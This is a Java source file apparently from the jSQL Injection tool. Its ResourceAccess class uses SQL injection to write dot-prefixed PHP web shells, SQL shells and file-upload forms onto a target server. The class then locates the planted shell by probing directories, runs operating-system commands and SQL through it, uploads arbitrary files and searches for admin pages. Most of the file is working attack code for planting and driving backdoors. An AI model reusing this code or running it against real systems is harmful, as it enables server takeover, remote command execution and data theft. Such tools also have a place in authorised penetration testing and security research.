/*******************************************************************************
 * Copyhacked (H) 2012-2020.
 * This program and the accompanying materials
 * are made available under no term at all, use it like
 * you want, but share and discuss about it
 * every time possible with every body.
 * 
 * Contributors:
 *      ron190 at ymail dot com - initial implementation
 ******************************************************************************/
package com.jsql.model.accessible;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.UnsupportedEncodingException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.Collections;
import java.util.EnumMap;
import java.util.List;
import java.util.Map;
import java.util.UUID;
import java.util.concurrent.CompletionService;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.ExecutorCompletionService;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import org.apache.commons.lang3.StringUtils;
import org.apache.log4j.Logger;

import com.jsql.model.InjectionModel;
import com.jsql.model.bean.util.Header;
import com.jsql.model.bean.util.Interaction;
import com.jsql.model.bean.util.Request;
import com.jsql.model.exception.InjectionFailureException;
import com.jsql.model.exception.JSqlException;
import com.jsql.model.exception.StoppedByUserSlidingException;
import com.jsql.model.suspendable.SuspendableGetRows;
import com.jsql.model.suspendable.callable.ThreadFactoryCallable;
import com.jsql.util.ConnectionUtil;
import com.jsql.util.HeaderUtil;

/**
 * Resource access object.
 * Get informations from file system, commands, webpage.
 */
public class ResourceAccess {
    
    /**
     * Log4j logger sent to view.
     */
    private static final Logger LOGGER = Logger.getRootLogger();

    /**
     * File name for web shell.
     */
    public final String filenameWebshell;
    
    /**
     * File name for sql shell.
     */
    public final String filenameSqlshell;
    
    /**
     * File name for upload form.
     */
    public final String filenameUpload;
    
    /**
     * True if admin page should stop, false otherwise.
     */
    public boolean isSearchAdminStopped = false;
    
    /**
     * True if scan list should stop, false otherwise.
     */
    public boolean isScanStopped = false;

    /**
     * True if ongoing file reading must stop, false otherwise.
     * If true any new file read is cancelled at start.
     */
    public boolean isSearchFileStopped = false;

    /**
     * True if current user has right to read file.
     */
    private boolean readingIsAllowed = false;

    /**
     * List of ongoing jobs.
     */
    public List<CallableFile> callablesReadFile = new ArrayList<>();
    
    private InjectionModel injectionModel;

    public ResourceAccess(InjectionModel injectionModel) {
        
        this.injectionModel = injectionModel;
        
        this.filenameWebshell = "." + this.injectionModel.getVersionJsql() + ".jw.php";
        this.filenameSqlshell = "." + this.injectionModel.getVersionJsql() + ".js.php";
        this.filenameUpload = "." + this.injectionModel.getVersionJsql() + ".ju.php";
    }

    public int callAdminPage(CompletionService<CallableHttpHead> taskCompletionService, int nbAdminPagesFound) {
        
        int nbAdminPagesFoundFixed = nbAdminPagesFound;
        
        try {
            CallableHttpHead currentCallable = taskCompletionService.take().get();
            
            if (currentCallable.isHttpResponseOk()) {
                
                Request request = new Request();
                request.setMessage(Interaction.CREATE_ADMIN_PAGE_TAB);
                request.setParameters(currentCallable.getUrl());
                this.injectionModel.sendToViews(request);

                nbAdminPagesFoundFixed++;
                LOGGER.debug("Found admin page: "+ currentCallable.getUrl());
            }
            
        } catch (InterruptedException | ExecutionException e) {
            
            LOGGER.error("Interruption while checking Admin pages", e);
            Thread.currentThread().interrupt();
        }
        
        return nbAdminPagesFoundFixed;
    }

    public void logSearchAdminPage(int nbAdminPagesFound, int submittedTasks, int tasksHandled) {
        
        String result =
            "Found "
            + nbAdminPagesFound
            + " admin page" +( nbAdminPagesFound > 1 ? 's' : StringUtils.EMPTY )
            + StringUtils.SPACE
            + (tasksHandled != submittedTasks ? "of "+ tasksHandled +" processed " : StringUtils.EMPTY)
            + "on "
            + submittedTasks
            + " page" + ( submittedTasks > 1 ? 's' : StringUtils.EMPTY )
            + " searched"
        ;
        
        if (nbAdminPagesFound > 0) {
            
            LOGGER.debug(result);
            
        } else {
            
            LOGGER.warn(result);
        }
    }
    
    /**
     * Create a webshell in the server.
     * @param pathShell Remote path of the file
     * @param url
     * @throws InterruptedException
     * @throws InjectionFailureException
     * @throws StoppedByUserSlidingException
     */
    public void createWebShell(String pathShell, String urlShell) throws JSqlException, InterruptedException {
        
        if (!this.isReadingAllowed()) {
            
            return;
        }
        
        String sourceShellToInject =
            this.injectionModel.getMediatorUtils()
            .getPropertiesUtil()
            .getProperties()
            .getProperty("shell.web")
            .replace(DataAccess.SHELL_LEAD, DataAccess.LEAD)
            .replace(DataAccess.SHELL_TRAIL, DataAccess.TRAIL);

        String pathShellFixed = pathShell;
        if (!pathShellFixed.matches(".*/$")) {
            
            pathShellFixed += "/";
        }
        
        this.injectionModel.injectWithoutIndex(
                
            this.injectionModel.getMediatorVendor().getVendor().instance().sqlTextIntoFile(sourceShellToInject, pathShellFixed + this.filenameWebshell)
        );

        String resultInjection;
        String[] sourcePage = {StringUtils.EMPTY};
        try {
            resultInjection = new SuspendableGetRows(this.injectionModel).run(
                this.injectionModel.getMediatorVendor().getVendor().instance().sqlFileRead(pathShellFixed + this.filenameWebshell),
                sourcePage,
                false,
                1,
                null
            );

            if (StringUtils.isEmpty(resultInjection)) {
                
                throw new JSqlException("payload integrity verification: Empty payload");
            }
            
        } catch (JSqlException e) {
            
            throw new JSqlException("injected payload does not match source", e);
        }
        
        String urlShellFixed = urlShell;
        
        if (!urlShellFixed.isEmpty()) {
            
            urlShellFixed = urlShellFixed.replaceAll("/*$", StringUtils.EMPTY) +"/";
        }
        
        String url = urlShellFixed;
        if (StringUtils.isEmpty(url)) {
            
            url = this.injectionModel.getMediatorUtils().getConnectionUtil().getUrlBase();
        }

        if (resultInjection.indexOf(sourceShellToInject) <= -1) {
            
            throw new JSqlException("Incorrect Web payload integrity: "+ sourcePage[0].trim().replaceAll("\\n", "\\\\\\n"));
        }
            
        LOGGER.debug("Web payload created into '"+ pathShellFixed + this.filenameWebshell +"'");

        String urlWithoutProtocol = url.replaceAll("^https?://[^/]*", StringUtils.EMPTY);
        
        String urlProtocol;
        
        if ("/".equals(urlWithoutProtocol)) {
            
            urlProtocol = url.replaceAll("/+$", StringUtils.EMPTY);
            
        } else {
            
            urlProtocol = url.replace(urlWithoutProtocol, StringUtils.EMPTY);
        }
        
        String urlWithoutFileName = urlWithoutProtocol.replaceAll("[^/]*$", StringUtils.EMPTY).replaceAll("/+", "/");
        
        List<String> directoryNames = new ArrayList<>();
        if (urlWithoutFileName.split("/").length == 0) {
            
            directoryNames.add("/");
        }
        
        for (String directoryName: urlWithoutFileName.split("/")) {
            
            directoryNames.add(directoryName +"/");
        }
        
        this.injectWebshell(pathShellFixed, urlShellFixed, urlProtocol, urlWithoutFileName, directoryNames);
    }

    private void injectWebshell(String pathShellFixed, String urlShellFixed, String urlProtocol, String urlWithoutFileName, List<String> directoryNames) throws InterruptedException {
        
        ExecutorService taskExecutor = Executors.newFixedThreadPool(10, new ThreadFactoryCallable("CallableCreateWebShell"));
        CompletionService<CallableHttpHead> taskCompletionService = new ExecutorCompletionService<>(taskExecutor);
        
        StringBuilder urlPart = new StringBuilder();
        
        for (String segment: directoryNames) {
            
            urlPart.append(segment);
            taskCompletionService.submit(new CallableHttpHead(urlProtocol + urlPart.toString() + this.filenameWebshell, this.injectionModel));
        }

        int submittedTasks = directoryNames.size() * 1;
        String urlSuccess = this.injectShell(urlShellFixed, urlProtocol, urlWithoutFileName, taskCompletionService, submittedTasks);

        taskExecutor.shutdown();
        taskExecutor.awaitTermination(5, TimeUnit.SECONDS);
        
        if (urlSuccess != null) {
            
            Request request = new Request();
            request.setMessage(Interaction.CREATE_SHELL_TAB);
            request.setParameters(pathShellFixed.replace(this.filenameWebshell, StringUtils.EMPTY), urlSuccess);
            this.injectionModel.sendToViews(request);
            
        } else {
            
            LOGGER.warn("HTTP connection to Web payload not found");
        }
    }

    private String injectShell(
        String urlShellFixed, String urlProtocol, String urlWithoutFileName,
        CompletionService<CallableHttpHead> taskCompletionService, int submittedTasks
    ) {
        
        String urlSuccess = null;
        
        for (int tasksHandled = 0 ; tasksHandled < submittedTasks ; tasksHandled++) {
            
            try {
                CallableHttpHead currentCallable = taskCompletionService.take().get();
                
                if (currentCallable.isHttpResponseOk()) {
                    
                    urlSuccess = currentCallable.getUrl();

                    if (
                        !urlShellFixed.isEmpty() && urlSuccess.replace(this.filenameWebshell, StringUtils.EMPTY).equals(urlShellFixed)
                        || urlSuccess.replace(this.filenameWebshell, StringUtils.EMPTY).equals(urlProtocol + urlWithoutFileName)
                    ) {
                        
                        LOGGER.debug("Connection to payload found at expected location '"+ urlSuccess +"'");
                        
                    } else {
                        
                        LOGGER.debug("Connection to payload found at unexpected location '"+ urlSuccess +"'");
                    }
                    
                } else {
                    
                    LOGGER.trace("Connection to payload not found at '"+ currentCallable.getUrl() +"'");
                }
                
            } catch (InterruptedException | ExecutionException e) {
                
                LOGGER.error("Interruption while checking Web shell", e);
                Thread.currentThread().interrupt();
            }
        }
        
        return urlSuccess;
    }
    
    /**
     * 
     * @param urlCommand
     * @return
     * @throws IOException
     */
    private String runCommandShell(String urlCommand) throws IOException {
        
        HttpURLConnection connection;

        String url = urlCommand;
        connection = (HttpURLConnection) new URL(url).openConnection();
        connection.setReadTimeout(this.injectionModel.getMediatorUtils().getConnectionUtil().getTimeout());
        connection.setConnectTimeout(this.injectionModel.getMediatorUtils().getConnectionUtil().getTimeout());

        String pageSource = null;
        try {
            pageSource = ConnectionUtil.getSource(connection);
            
        } catch (Exception e) {
            
            pageSource = StringUtils.EMPTY;
        }
        
        Matcher regexSearch = Pattern.compile("(?s)<"+ DataAccess.LEAD +">(.*)<"+ DataAccess.TRAIL +">").matcher(pageSource);
        regexSearch.find();

        String result;
        
        // IllegalStateException #1544: catch incorrect execution
        try {
            result = regexSearch.group(1);
            
        } catch (IllegalStateException e) {
            
            // Fix return null from regex
            result = StringUtils.EMPTY;
            LOGGER.warn("Incorrect response from Web shell", e);
        }
        
        Map<Header, Object> msgHeader = new EnumMap<>(Header.class);
        msgHeader.put(Header.URL, url);
        msgHeader.put(Header.POST, StringUtils.EMPTY);
        msgHeader.put(Header.HEADER, StringUtils.EMPTY);
        msgHeader.put(Header.RESPONSE, HeaderUtil.getHttpHeaders(connection));
        msgHeader.put(Header.SOURCE, pageSource);
        
        Request request = new Request();
        request.setMessage(Interaction.MESSAGE_HEADER);
        request.setParameters(msgHeader);
        this.injectionModel.sendToViews(request);
        
        return result;
    }
    
    /**
     * Run a shell command on host.
     * @param command The command to execute
     * @param uuidShell An unique identifier for terminal
     * @param urlShell Web path of the shell
     */
    public void runWebShell(String command, UUID uuidShell, String urlShell) {
        
        String result = StringUtils.EMPTY;
        
        try {
            result = this.runCommandShell(
                urlShell + "?c="+ URLEncoder.encode(command.trim(), "ISO-8859-1")
            );
            
            if (StringUtils.isBlank(result)) {
                result = "No result.\nTry '"+ command.trim() +" 2>&1' to get a system error message.\n";
            }
            
        } catch (UnsupportedEncodingException e) {
            
            LOGGER.warn("Encoding command to ISO-8859-1 failed: "+ e.getMessage(), e);
            
        } catch (IOException e) {
            
            LOGGER.warn("Shell execution error: "+ e.getMessage(), e);
            
        } finally {
            
            // Unfroze interface
            Request request = new Request();
            request.setMessage(Interaction.GET_WEB_SHELL_RESULT);
            request.setParameters(uuidShell, result);
            this.injectionModel.sendToViews(request);
        }
    }

    /**
     * Create SQL shell on the server. Override user name and password eventually.
     * @param pathShell Script to create on the server
     * @param url URL for the script (used for url rewriting)
     * @param username User name for current database
     * @param password User password for current database
     * @throws InterruptedException
     * @throws InjectionFailureException
     * @throws StoppedByUserSlidingException
     */
    public void createSqlShell(String pathShell, String urlShell, String username, String password) throws JSqlException, InterruptedException {
        
        if (!this.isReadingAllowed()) {
            
            return;
        }
        
        String sourceShellToInject =
            this.injectionModel.getMediatorUtils()
            .getPropertiesUtil()
            .getProperties()
            .getProperty("shell.sql")
            .replace(DataAccess.SHELL_LEAD, DataAccess.LEAD)
            .replace(DataAccess.SHELL_TRAIL, DataAccess.TRAIL);

        String pathShellFixed = pathShell;
        if (!pathShellFixed.matches(".*/$")) {
            
            pathShellFixed += "/";
        }
        
        this.injectionModel.injectWithoutIndex(
            this.injectionModel.getMediatorVendor().getVendor().instance().sqlTextIntoFile(sourceShellToInject, pathShellFixed + this.filenameSqlshell)
        );

        String resultInjection;
        String[] sourcePage = {StringUtils.EMPTY};
        
        try {
            resultInjection = new SuspendableGetRows(this.injectionModel).run(
                this.injectionModel.getMediatorVendor().getVendor().instance().sqlFileRead(pathShellFixed + this.filenameSqlshell),
                sourcePage,
                false,
                1,
                null
            );

            if (StringUtils.isEmpty(resultInjection)) {
                
                throw new JSqlException("payload integrity verification: Empty payload");
            }
            
        } catch (JSqlException e) {
            
            throw new JSqlException("injected payload does not match source", e);
        }
        
        String urlShellFixed = urlShell;
        
        if (!urlShellFixed.isEmpty()) {
            
            urlShellFixed = urlShellFixed.replaceAll("/*$", StringUtils.EMPTY) +"/";
        }
        
        String url = urlShellFixed;
        if (StringUtils.isEmpty(url)) {
            
            url = this.injectionModel.getMediatorUtils().getConnectionUtil().getUrlBase();
        }

        if (resultInjection.indexOf(sourceShellToInject) <= -1) {
            
            throw new JSqlException("Incorrect SQL payload integrity: "+ sourcePage[0].trim().replaceAll("\\n", "\\\\\\n"));
        }
            
        LOGGER.debug("SQL payload created into '"+ pathShellFixed + this.filenameSqlshell +"'");
        
        String urlWithoutProtocol = url.replaceAll("^https?://[^/]*", StringUtils.EMPTY);
        
        String urlProtocol;
        
        if ("/".equals(urlWithoutProtocol)) {
            
            urlProtocol = url.replaceAll("/+$", StringUtils.EMPTY);
            
        } else {
            
            urlProtocol = url.replace(urlWithoutProtocol, StringUtils.EMPTY);
        }
        
        String urlWithoutFileName = urlWithoutProtocol.replaceAll("[^/]*$", StringUtils.EMPTY).replaceAll("/+", "/");
        
        List<String> directoryNames = new ArrayList<>();
        
        if (urlWithoutFileName.split("/").length == 0) {
            
            directoryNames.add("/");
        }
        
        for (String directoryName: urlWithoutFileName.split("/")) {
            
            directoryNames.add(directoryName +"/");
        }
        
        this.injectShell(username, password, pathShellFixed, urlShellFixed, urlProtocol, urlWithoutFileName, directoryNames);
    }

    private void injectShell(
        String username, String password, String pathShellFixed, String urlShellFixed,
        String urlProtocol, String urlWithoutFileName, List<String> directoryNames
    ) throws InterruptedException {
        
        ExecutorService taskExecutor = Executors.newFixedThreadPool(10, new ThreadFactoryCallable("CallableCreateSqlShell"));
        CompletionService<CallableHttpHead> taskCompletionService = new ExecutorCompletionService<>(taskExecutor);
        
        StringBuilder urlPart = new StringBuilder();
        
        for (String segment: directoryNames) {
            
            urlPart.append(segment);
            taskCompletionService.submit(new CallableHttpHead(urlProtocol + urlPart.toString() + this.filenameSqlshell, this.injectionModel));
        }

        int submittedTasks = directoryNames.size() * 1;
        int tasksHandled;
        String urlSuccess = null;
        
        for (tasksHandled = 0 ; tasksHandled < submittedTasks ; tasksHandled++) {
            
            try {
                CallableHttpHead currentCallable = taskCompletionService.take().get();
                
                if (currentCallable.isHttpResponseOk()) {
                    
                    urlSuccess = currentCallable.getUrl();

                    if (
                        !urlShellFixed.isEmpty() && urlSuccess.replace(this.filenameSqlshell, StringUtils.EMPTY).equals(urlShellFixed)
                        || urlSuccess.replace(this.filenameSqlshell, StringUtils.EMPTY).equals(urlProtocol + urlWithoutFileName)
                    ) {
                        
                        LOGGER.debug("Connection to payload found at expected location '"+ urlSuccess +"'");
                        
                    } else {
                        
                        LOGGER.debug("Connection to payload found at unexpected location '"+ urlSuccess +"'");
                    }
                } else {
                    
                    LOGGER.trace("Connection to payload not found at '"+ currentCallable.getUrl() +"'");
                }
                
            } catch (InterruptedException | ExecutionException e) {
                
                LOGGER.error("Interruption while checking SQL shell", e);
                Thread.currentThread().interrupt();
            }
        }

        taskExecutor.shutdown();
        taskExecutor.awaitTermination(5, TimeUnit.SECONDS);
        
        if (urlSuccess != null) {
            
            Request request = new Request();
            request.setMessage(Interaction.CREATE_SQL_SHELL_TAB);
            request.setParameters(pathShellFixed.replace(this.filenameSqlshell, StringUtils.EMPTY), urlSuccess, username, password);
            this.injectionModel.sendToViews(request);
            
        } else {
            
            LOGGER.warn("HTTP connection to SQL payload not found");
        }
    }

    /**
     * Execute SQL request into terminal defined by URL path, eventually override with database user/pass identifiers.
     * @param command SQL request to execute
     * @param uuidShell Identifier of terminal sending the request
     * @param urlShell URL to send SQL request against
     * @param username User name [optional]
     * @param password USEr password [optional]
     */
    public void runSqlShell(String command, UUID uuidShell, String urlShell, String username, String password) {
        
        String result = StringUtils.EMPTY;
        
        try {
            result = this.runCommandShell(
                urlShell + "?q="+ URLEncoder.encode(command.trim(), "ISO-8859-1") +"&u="+ username +"&p="+ password
            );
            
            if (result.indexOf("<SQLr>") > -1) {
                
                List<List<String>> listRows = this.parse(result);

                if (listRows.isEmpty()) {
                    return;
                }
                
                List<Integer> listFieldsLength = this.parseColumnLength(listRows);

                result = this.convert(listRows, listFieldsLength);
                
            } else if (result.indexOf("<SQLm>") > -1) {
                
                result = result.replace("<SQLm>", StringUtils.EMPTY) + "\n";
                
            } else if (result.indexOf("<SQLe>") > -1) {
                
                result = result.replace("<SQLe>", StringUtils.EMPTY) + "\n";
            }
            
        } catch (UnsupportedEncodingException e) {
            
            LOGGER.warn("Encoding command to ISO-8859-1 failed: "+ e.getMessage(), e);
            
        } catch (IOException e) {
            
            LOGGER.warn("Shell execution error: "+ e.getMessage(), e);
            
        } finally {
            
            // Unfroze interface
            Request request = new Request();
            request.setMessage(Interaction.GET_SQL_SHELL_RESULT);
            request.setParameters(uuidShell, result, command);
            this.injectionModel.sendToViews(request);
        }
    }

    private String convert(List<List<String>> listRows, List<Integer> listFieldsLength) {
        
        StringBuilder tableText = new StringBuilder("+");
        
        for (Integer fieldLength: listFieldsLength) {
            
            tableText.append("-"+ StringUtils.repeat("-", fieldLength) +"-+");
        }
        
        tableText.append("\n");

        for (List<String> listFields: listRows) {
            
            tableText.append("|");
            int cursorPosition = 0;
            
            for (String field: listFields) {
                
                tableText.append(
                    StringUtils.SPACE
                    + field
                    + StringUtils.repeat(StringUtils.SPACE, listFieldsLength.get(cursorPosition) - field.length())
                    + " |"
                );
                cursorPosition++;
            }
            
            tableText.append("\n");
        }

        tableText.append("+");
        
        for (Integer fieldLength: listFieldsLength) {
            
            tableText.append("-"+ StringUtils.repeat("-", fieldLength) +"-+");
        }
        
        tableText.append("\n");
        
        return tableText.toString();
    }

    private List<Integer> parseColumnLength(List<List<String>> listRows) {
        
        List<Integer> listFieldsLength = new ArrayList<>();
        
        for (
            int indexLongestRowSearch = 0;
            indexLongestRowSearch < listRows.get(0).size();
            indexLongestRowSearch++
        ) {
            
            int indexLongestRowSearchFinal = indexLongestRowSearch;
            
            Collections.sort(
                listRows,
                (firstRow, secondRow) -> secondRow.get(indexLongestRowSearchFinal).length() - firstRow.get(indexLongestRowSearchFinal).length()
            );

            listFieldsLength.add(listRows.get(0).get(indexLongestRowSearch).length());
        }
        
        return listFieldsLength;
    }

    private List<List<String>> parse(String result) {
        
        List<List<String>> listRows = new ArrayList<>();
        Matcher rowsMatcher = Pattern.compile("(?si)<tr>(<td>.*?</td>)</tr>").matcher(result);
        
        while (rowsMatcher.find()) {
            
            String values = rowsMatcher.group(1);

            Matcher fieldsMatcher = Pattern.compile("(?si)<td>(.*?)</td>").matcher(values);
            List<String> listFields = new ArrayList<>();
            listRows.add(listFields);
            
            while (fieldsMatcher.find()) {
                
                String field = fieldsMatcher.group(1);
                listFields.add(field);
            }
        }
        
        return listRows;
    }

    /**
     * Upload a file to the server.
     * @param pathFile Remote path of the file to upload
     * @param urlFile URL of uploaded file
     * @param file File to upload
     * @throws JSqlException
     * @throws IOException
     */
    public void uploadFile(String pathFile, String urlFile, File file) throws JSqlException, IOException {
        
        if (!this.isReadingAllowed()) {
            
            return;
        }
        
        String sourceShellToInject =
            this.injectionModel.getMediatorUtils()
            .getPropertiesUtil()
            .getProperties()
            .getProperty("shell.upload")
            .replace(DataAccess.SHELL_LEAD, DataAccess.LEAD);
        
        String pathShellFixed = pathFile;
        
        if (!pathShellFixed.matches(".*/$")) {
            
            pathShellFixed += "/";
        }
        
        this.injectionModel.injectWithoutIndex(
            this.injectionModel.getMediatorVendor().getVendor().instance().sqlTextIntoFile("<"+ DataAccess.LEAD +">"+ sourceShellToInject +"<"+ DataAccess.TRAIL +">", pathShellFixed + this.filenameUpload)
        );

        String[] sourcePage = {StringUtils.EMPTY};
        String sourceShellInjected;
        
        try {
            sourceShellInjected = new SuspendableGetRows(this.injectionModel).run(
                this.injectionModel.getMediatorVendor().getVendor().instance().sqlFileRead(pathShellFixed + this.filenameUpload),
                sourcePage,
                false,
                1,
                null
            );
            
            if (StringUtils.isEmpty(sourceShellInjected)) {
                
                throw new JSqlException("Bad payload integrity: Empty payload");
            }
            
        } catch (JSqlException e) {
            
            throw new JSqlException("Payload integrity verification failed: "+ sourcePage[0].trim().replaceAll("\\n", "\\\\\\n"), e);
        }

        String urlFileFixed = urlFile;
        if (StringUtils.isEmpty(urlFileFixed)) {
            
            urlFileFixed = this.injectionModel.getMediatorUtils().getConnectionUtil().getUrlBase().substring(0, this.injectionModel.getMediatorUtils().getConnectionUtil().getUrlBase().lastIndexOf('/') + 1);
        }
        
        if (sourceShellInjected.indexOf(sourceShellToInject) > -1) {
            
            LOGGER.debug("Upload payload deployed at '"+ urlFileFixed + this.filenameUpload +"' in '"+ pathShellFixed + this.filenameUpload +"'");
            
            String crLf = "\r\n";
            
            URL urlUploadShell = new URL(urlFileFixed +"/"+ this.filenameUpload);
            URLConnection connection = urlUploadShell.openConnection();
            connection.setDoOutput(true);
            
            try (InputStream streamToUpload = new FileInputStream(file)) {

                this.upload(file, crLf, connection, streamToUpload);
                
                this.confirmUpload(file, pathShellFixed, urlFileFixed, connection);
            }
            
        } else {
            
            throw new JSqlException("Incorrect Upload payload integrity: "+ sourcePage[0].trim().replaceAll("\\n", "\\\\\\n"));
        }
        
        Request request = new Request();
        request.setMessage(Interaction.END_UPLOAD);
        this.injectionModel.sendToViews(request);
    }

    private void upload(File file, String crLf, URLConnection connection, InputStream streamToUpload) throws IOException, JSqlException {
        
        byte[] streamData = new byte[streamToUpload.available()];
        
        if (streamToUpload.read(streamData) == -1) {
            
            throw new JSqlException("Error reading the file");
        }
        
        String headerForm = StringUtils.EMPTY;
        headerForm += "-----------------------------4664151417711"+ crLf;
        headerForm += "Content-Disposition: form-data; name=\"u\"; filename=\""+ file.getName() +"\""+ crLf;
        headerForm += "Content-Type: binary/octet-stream"+ crLf;
        headerForm += crLf;

        String headerFile = StringUtils.EMPTY;
        headerFile += crLf +"-----------------------------4664151417711--"+ crLf;

        connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=---------------------------4664151417711");
        connection.setRequestProperty("Content-Length", String.valueOf(headerForm.length() + headerFile.length() + streamData.length));

        try (OutputStream streamOutputFile = connection.getOutputStream()) {
            
            streamOutputFile.write(headerForm.getBytes());
   
            int index = 0;
            int size = 1024;
            
            do {
                if (index + size > streamData.length) {
                    size = streamData.length - index;
                }
                
                streamOutputFile.write(streamData, index, size);
                index += size;
                
            } while (index < streamData.length);
   
            streamOutputFile.write(headerFile.getBytes());
            streamOutputFile.flush();
        }
    }

    private void confirmUpload(File file, String pathShellFixed, String urlFileFixed, URLConnection connection) throws IOException {
        
        try (InputStream streamInputFile = connection.getInputStream()) {
            
            char buff = 512;
            int len;
            byte[] data = new byte[buff];
            StringBuilder result = new StringBuilder();
            
            do {
                len = streamInputFile.read(data);
   
                if (len > 0) {
                    
                    result.append(new String(data, 0, len));
                }
                
            } while (len > 0);
   
            if (result.indexOf(DataAccess.LEAD +"y") > -1) {
                
                LOGGER.debug("File '"+ file.getName() +"' uploaded into '"+ pathShellFixed +"'");
                
            } else {
                
                LOGGER.warn("Upload file '"+ file.getName() +"' into '"+ pathShellFixed +"' failed");
            }
            
            Map<Header, Object> msgHeader = new EnumMap<>(Header.class);
            msgHeader.put(Header.URL, urlFileFixed);
            msgHeader.put(Header.POST, StringUtils.EMPTY);
            msgHeader.put(Header.HEADER, StringUtils.EMPTY);
            msgHeader.put(Header.RESPONSE, HeaderUtil.getHttpHeaders(connection));
            msgHeader.put(Header.SOURCE, result.toString());
   
            Request request = new Request();
            request.setMessage(Interaction.MESSAGE_HEADER);
            request.setParameters(msgHeader);
            this.injectionModel.sendToViews(request);
        }
    }
    
    /**
     * Check if current user can read files.
     * @return True if user can read file, false otherwise
     * @throws JSqlException when an error occurs during injection
     */
    public boolean isReadingAllowed() throws JSqlException {
        
        // Unsupported Reading file when <file> is not present in current xmlModel
        // Fix #41055: NullPointerException on getFile()
        if (this.injectionModel.getMediatorVendor().getVendor().instance().getModelYaml().getResource().getFile() == null) {
            
            LOGGER.warn("Reading file on "+ this.injectionModel.getMediatorVendor().getVendor() +" is currently not supported");
            return false;
        }
        
        String[] sourcePage = {StringUtils.EMPTY};

        String resultInjection = new SuspendableGetRows(this.injectionModel).run(
            this.injectionModel.getMediatorVendor().getVendor().instance().sqlPrivilegeTest(),
            sourcePage,
            false,
            1,
            null
        );

        if (StringUtils.isEmpty(resultInjection)) {
            
            this.injectionModel.sendResponseFromSite("Can't read privilege", sourcePage[0].trim());
            Request request = new Request();
            request.setMessage(Interaction.MARK_FILE_SYSTEM_INVULNERABLE);
            this.injectionModel.sendToViews(request);
            this.readingIsAllowed = false;
            
        } else if ("false".equals(resultInjection)) {
            
            LOGGER.warn("Privilege FILE is not granted to current user, files can't be read");
            Request request = new Request();
            request.setMessage(Interaction.MARK_FILE_SYSTEM_INVULNERABLE);
            this.injectionModel.sendToViews(request);
            this.readingIsAllowed = false;
            
        } else {
            
            Request request = new Request();
            request.setMessage(Interaction.MARK_FILE_SYSTEM_VULNERABLE);
            this.injectionModel.sendToViews(request);
            this.readingIsAllowed = true;
        }
        
        return this.readingIsAllowed;
    }
    
    /**
     * Mark the search of files to stop.
     * Any ongoing file reading is interrupted and any new file read
     * is cancelled.
     */
    public void stopSearchingFile() {
        
        this.isSearchFileStopped = true;
        
        // Force ongoing suspendable to stop immediately
        for (CallableFile callable: this.callablesReadFile) {
            
            callable.getSuspendableReadFile().stop();
        }
    }
    
    // Getters and setters
    
    public boolean isSearchAdminStopped() {
        return this.isSearchAdminStopped;
    }

    public void setSearchAdminStopped(boolean isSearchAdminStopped) {
        this.isSearchAdminStopped = isSearchAdminStopped;
    }
    
    public void setScanStopped(boolean isScanStopped) {
        this.isScanStopped = isScanStopped;
    }

    public boolean isReadingIsAllowed() {
        return this.readingIsAllowed;
    }

    public void setReadingIsAllowed(boolean readingIsAllowed) {
        this.readingIsAllowed = readingIsAllowed;
    }
}
